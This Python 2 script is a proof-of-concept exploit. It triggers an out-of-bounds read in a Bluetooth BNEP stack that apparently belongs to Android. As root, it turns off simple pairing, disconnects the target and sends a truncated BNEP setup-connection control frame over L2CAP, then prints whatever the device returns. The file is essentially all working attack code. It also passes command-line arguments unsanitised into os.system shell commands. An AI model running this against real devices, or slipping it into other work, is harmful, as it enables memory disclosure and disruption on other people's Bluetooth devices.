import os
import sys
import struct

import bluetooth


BNEP_PSM = 15
BNEP_FRAME_CONTROL = 0x01

# Control types (parsed by bnep_process_control_packet() in bnep_utils.cc)
BNEP_SETUP_CONNECTION_REQUEST_MSG = 0x01


def oob_read(src_bdaddr, dst):

    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bnep.settimeout(5)
    bnep.bind((src_bdaddr, 0))
    print 'Connecting to BNEP...'
    bnep.connect((dst, BNEP_PSM))
    bnep.settimeout(1)
    print "Triggering OOB read (you may need a debugger to verify that it's actually happening)..."

    # This crafted BNEP packet just contains the BNEP_FRAME_CONTROL frame type,
    # plus the BNEP_SETUP_CONNECTION_REQUEST_MSG control type.
    # It doesn't include the 'len' field, therefore it is read from out of bounds
    bnep.send(struct.pack('<BB', BNEP_FRAME_CONTROL, BNEP_SETUP_CONNECTION_REQUEST_MSG))
    try:
        data = bnep.recv(3)
    except bluetooth.btcommon.BluetoothError:
        data = ''

    if data:
        print '%r' % data
    else:
        print '[No data]'

    print 'Closing connection.'
    bnep.close()


def main(src_hci, dst):
    os.system('hciconfig %s sspmode 0' % (src_hci,))
    os.system('hcitool dc %s' % (dst,))

    oob_read(src_hci, dst)


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('Usage: python bnep02.py <src-bdaddr> <dst-bdaddr>')
    else:
        if os.getuid():
            print 'Error: This script must be run as root.'
        else:
            main(sys.argv[1], sys.argv[2])